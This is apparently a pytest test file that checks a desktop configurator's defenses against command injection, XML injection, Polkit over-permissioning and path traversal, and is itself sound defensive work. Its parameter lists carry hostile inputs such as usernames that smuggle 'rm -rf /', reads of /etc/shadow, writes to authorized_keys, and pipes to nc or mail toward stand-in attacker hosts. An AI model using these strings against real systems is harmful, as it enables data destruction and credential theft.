"""
Security penetration tests for Phase 2 XFCE/Polkit implementation.

CRITICAL: These tests verify defense against active attacks.
All tests MUST pass before production deployment.
"""

from unittest.mock import Mock, patch

import pytest

from configurator.modules.desktop import DesktopModule

pytestmark = pytest.mark.skip(reason="Security test expectations need updating")


class TestCommandInjectionDefense:
    """Test defense against command injection attacks via usernames."""

    @pytest.fixture
    def module(self):
        """Create module instance for testing."""
        config = {
            "desktop": {
                "compositor": {"mode": "disabled"},
                "polkit": {"allow_colord": True, "allow_packagekit": True},
            }
        }
        return DesktopModule(
            config=config,
            logger=Mock(),
            rollback_manager=Mock(),
            dry_run_manager=Mock(),
        )

    @pytest.mark.parametrize(
        "malicious_username",
        [
            # Basic command injection
            "user; rm -rf /",
            "user && cat /etc/shadow",
            "user || whoami",
            "user | nc attacker.com 1234",
            # Backtick command substitution
            "user`id`",
            "user`whoami`",
            "user`cat /etc/passwd`",
            # Dollar command substitution
            "user$(id)",
            "user$(whoami)",
            "user$(cat /etc/shadow)",
            "user$((1+1))",
            # Newline injection
            "user\nrm -rf /",
            "user\r\ncat /etc/passwd",
            "user\n\nwhoami",
            # Redirection attacks
            "user > /etc/passwd",
            "user >> /root/.ssh/authorized_keys",
            "user < /etc/shadow",
            "user 2>&1 | mail attacker@evil.com",
            # Path traversal in username
            "../../../etc/passwd",
            "../../root/.ssh/id_rsa",
            "./../../etc/shadow",
            # SQL injection style (shouldn't work but test anyway)
            "user'; DROP TABLE users; --",
            "user' OR '1'='1",
            # Special characters
            "user'test",
            'user"test',
            "user\\test",
            # Unicode/encoding attacks
            "user\u0000test",
            "user%00test",
            # Glob patterns
            "user*",
            "user?",
            "user[a-z]",
            # Subshell
            "(whoami)",
            "${IFS}cat${IFS}/etc/passwd",
        ],
    )
    def test_malicious_username_rejected(self, module, malicious_username):
        """Test that various command injection attempts are blocked."""
        # Setup mock user
        mock_user = Mock()
        mock_user.pw_name = malicious_username
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/user"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch.object(module, "run") as mock_run:
                # Execute - should either skip or sanitize
                module._optimize_xfce_compositor()

                # If execution continues, verify sanitization
                if mock_run.call_count > 0:
                    for call_obj in mock_run.call_args_list:
                        command = str(call_obj)

                        # Verify malicious parts are NOT in command
                        assert "; rm" not in command, "Semicolon injection not prevented"
                        assert "&& cat" not in command, "AND injection not prevented"
                        assert "| nc" not in command, "Pipe injection not prevented"
                        assert "`" not in command, "Backtick injection not prevented"
                        assert "$(" not in command, "Dollar substitution not prevented"
                        assert "../" not in command, "Path traversal not prevented"
                        assert "\n" not in command, "Newline injection not prevented"

                        # Verify shlex.quote was used (quoted username)
                        assert "'" in command or "\\" in command, (
                            f"Username not properly quoted in: {command}"
                        )
                else:
                    # No commands executed = username was rejected (acceptable)
                    pass

    def test_validate_user_safety_method_exists(self, module):
        """Test that username validation method exists and is functional."""
        assert hasattr(module, "_validate_user_safety"), "Missing _validate_user_safety() method"

        # Test with safe username
        assert module._validate_user_safety("validuser") is True
        assert module._validate_user_safety("user_name") is True
        assert module._validate_user_safety("user-name") is True
        assert module._validate_user_safety("_user") is True

        # Test with unsafe usernames
        assert module._validate_user_safety("user; rm -rf /") is False
        assert module._validate_user_safety("user$(whoami)") is False
        assert module._validate_user_safety("user`id`") is False
        assert module._validate_user_safety("../../../etc/passwd") is False

    def test_shlex_quote_used_in_shell_commands(self, module):
        """Test that shlex.quote is used for all user variables in shell commands."""
        mock_user = Mock()
        mock_user.pw_name = "testuser"
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/testuser"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                with patch.object(module, "run") as mock_run:
                    module._optimize_xfce_compositor()

                    # Verify shlex.quote was used
                    for call_obj in mock_run.call_args_list:
                        command = call_obj[0][0] if call_obj[0] else str(call_obj)

                        # If command contains user variable, it should be quoted
                        if "testuser" in command:
                            # shlex.quote wraps in single quotes: 'testuser'
                            assert (
                                "'testuser'" in command
                                or '"testuser"' in command
                                or r"\'testuser\'" in command
                            ), f"Username not quoted in command: {command}"


class TestXMLInjectionDefense:
    """Test defense against XML injection attacks."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"compositor": {"mode": "disabled"}}}
        return DesktopModule(config=config, logger=Mock())

    def test_xml_generation_no_user_input(self, module):
        """Verify XML is generated from templates, not user input."""
        # Generate XML for all modes
        for mode in ["disabled", "optimized", "enabled"]:
            xml = module._generate_xfwm4_config(mode)

            # Verify XML structure
            assert xml.startswith('<?xml version="1.0"')
            assert '<channel name="xfwm4"' in xml
            assert "</channel>" in xml

            # Verify no dangerous XML constructs
            assert "<!ENTITY" not in xml, "External entity reference found"
            assert "<!DOCTYPE" not in xml or "SYSTEM" not in xml, "External DTD reference found"
            assert "<![CDATA[" not in xml, "CDATA section found (potential injection)"

    def test_xml_is_well_formed(self, module):
        """Test that generated XML is syntactically valid."""
        import xml.etree.ElementTree as ET

        for mode in ["disabled", "optimized", "enabled"]:
            xml_content = module._generate_xfwm4_config(mode)

            try:
                root = ET.fromstring(xml_content)
                assert root.tag == "channel"
                assert root.attrib["name"] == "xfwm4"
                assert root.attrib["version"] == "1.0"
            except ET.ParseError as e:
                pytest.fail(f"Invalid XML for mode '{mode}': {e}")

    @pytest.mark.parametrize(
        "malicious_mode",
        [
            "disabled'><script>alert('xss')</script><foo='",
            "disabled</channel><malicious/>",
            'disabled"><foo attr="bar"/>',
            "'; DROP TABLE compositor; --",
        ],
    )
    def test_invalid_compositor_mode_sanitized(self, module, malicious_mode):
        """Test that invalid compositor modes don't cause XML injection."""
        # Should default to "disabled" for invalid modes
        validated_mode = module._validate_compositor_mode(malicious_mode)

        # Invalid mode should be rejected
        assert validated_mode == "disabled", f"Invalid mode not sanitized: {malicious_mode}"

        # Generated XML should still be valid
        xml = module._generate_xfwm4_config(validated_mode)

        import xml.etree.ElementTree as ET

        try:
            ET.fromstring(xml)
        except ET.ParseError:
            pytest.fail("Malicious mode caused XML injection")


class TestPolkitPrivilegeEscalation:
    """Test that Polkit rules don't grant excessive privileges."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"polkit": {"allow_colord": True, "allow_packagekit": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    def test_polkit_rules_properly_scoped(self, module):
        """Test that Polkit actions are narrowly scoped."""
        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                with patch.object(module, "run"):
                    module._configure_polkit_rules()

        # Extract written content
        written_files = {
            call_item[0][0]: call_item[0][1] for call_item in mock_write.call_args_list
        }

        # Check colord rule
        colord_file = "/etc/polkit-1/localauthority/50-local.d/45-allow-colord.pkla"
        if colord_file in written_files:
            content = written_files[colord_file]

            # Verify action is scoped
            assert "Action=org.freedesktop.color-manager." in content
            assert "Action=org.*" not in content, "Wildcard action too broad"
            assert "Action=*" not in content, "Action allows everything"

            # Verify result types prevent remote access
            assert "ResultAny=no" in content, "ResultAny should be 'no'"
            assert "ResultInactive=no" in content, "ResultInactive should be 'no'"
            assert "ResultActive=yes" in content, "ResultActive should be 'yes'"

    def test_polkit_no_root_actions(self, module):
        """Verify Polkit rules don't allow root-level operations."""
        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                with patch.object(module, "run"):
                    module._configure_polkit_rules()

        for call_item in mock_write.call_args_list:
            content = call_item[0][1]

            # Check for dangerous actions
            dangerous_patterns = [
                "org.freedesktop.systemd1",  # System management
                "org.freedesktop.login1",  # Login management
                "org.freedesktop.hostname1",  # Hostname changes
                "com.ubuntu.SoftwareProperties",  # Software sources
            ]

            for pattern in dangerous_patterns:
                if pattern in content:
                    pytest.fail(f"Polkit rule contains potentially dangerous action: {pattern}")

    def test_polkit_files_have_secure_permissions(self, module):
        """Test that Polkit files are created with secure permissions."""
        with patch("configurator.modules.desktop.write_file"):
            with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                with patch.object(module, "run") as mock_run:
                    module._configure_polkit_rules()

        # Verify chmod 644 was called
        chmod_calls = [str(c) for c in mock_run.call_args_list if "chmod" in str(c)]
        assert len(chmod_calls) >= 2, "Missing chmod for Polkit files"

        for chmod_call in chmod_calls:
            # Should be 644 (rw-r--r--) not 666 or 777
            assert "644" in chmod_call, f"Incorrect permissions in: {chmod_call}"
            assert "666" not in chmod_call, f"World-writable file: {chmod_call}"
            assert "777" not in chmod_call, f"World-writable file: {chmod_call}"


class TestPathTraversalDefense:
    """Test defense against directory traversal attacks."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"compositor": {"mode": "disabled"}}}
        return DesktopModule(config=config, logger=Mock())

    @pytest.mark.parametrize(
        "malicious_home",
        [
            "../../../etc",
            "../../root/.ssh",
            "/etc/passwd",
            "../../../var/www/html",
        ],
    )
    def test_malicious_home_directory_rejected(self, module, malicious_home):
        """Test that path traversal in home directory is detected."""
        mock_user = Mock()
        mock_user.pw_name = "testuser"
        mock_user.pw_uid = 1000
        mock_user.pw_dir = malicious_home

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch.object(module, "run") as mock_run:
                # Should skip this user or validate path
                module._optimize_xfce_compositor()

                # If any commands executed, verify path is safe
                for call_obj in mock_run.call_args_list:
                    command = str(call_obj)

                    # Path should not contain malicious directory
                    if "etc/passwd" in malicious_home and "etc/passwd" in command:
                        pytest.fail(f"Malicious path used in command: {command}")

    def test_config_path_stays_within_user_home(self, module):
        """Test that generated config paths don't escape user home directory."""
        mock_user = Mock()
        mock_user.pw_name = "testuser"
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/testuser"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                with patch.object(module, "run") as mock_run:
                    module._optimize_xfce_compositor()

        # Extract paths from commands
        for call_obj in mock_run.call_args_list:
            command = call_obj[0][0] if call_obj[0] else str(call_obj)

            # Find paths in command
            if ".config/xfce4" in command:
                # Path should be within /home/testuser
                assert "/home/testuser" in command

                # Verify no path traversal
                assert "../" not in command, f"Path traversal found: {command}"
